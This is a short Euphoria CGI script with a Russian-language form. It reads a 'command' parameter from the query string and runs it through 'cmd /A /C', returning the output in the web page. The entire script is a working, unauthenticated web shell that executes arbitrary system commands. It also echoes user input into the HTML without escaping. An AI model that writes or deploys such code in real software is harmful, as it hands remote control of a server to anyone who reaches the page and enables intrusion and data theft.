include std/pipeio.e
include std/search.e

puts(1,"Content-type: text/html\n")
puts(1,"\n")
puts(1,"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\n")
puts(1,"<html><body>\n")
puts(1,"<form method=\"GET\" action=\"cgi1.exe\" accept-charset=\"cpp-866\" target=\"_self\">\n")
puts(1,"<p><b>Введите команду:</b></p>\n")
puts(1,"<p><input type=\"text\" name=\"command\" size=\"30\"><br>\n")
puts(1,"<input type=\"submit\">\n")
puts(1,"<input type=\"reset\"></p>\n")
puts(1,"</form>\n")
puts(1,"Результат:")
	sequence command = getenv("QUERY_STRING")
	command=command[find('=',command)+1..$]
	command=find_replace('+',command,' ')
	puts(1,command & "<br>\n<p>")
	object main_pipe = pipeio:exec("cmd /A /C " & command, pipeio:create())
	puts(1,pipeio:read(main_pipe[STDOUT],10000))
	pipeio:kill(main_pipe)
	puts(1,"</p>\n")
puts(1,"</body></html>\n")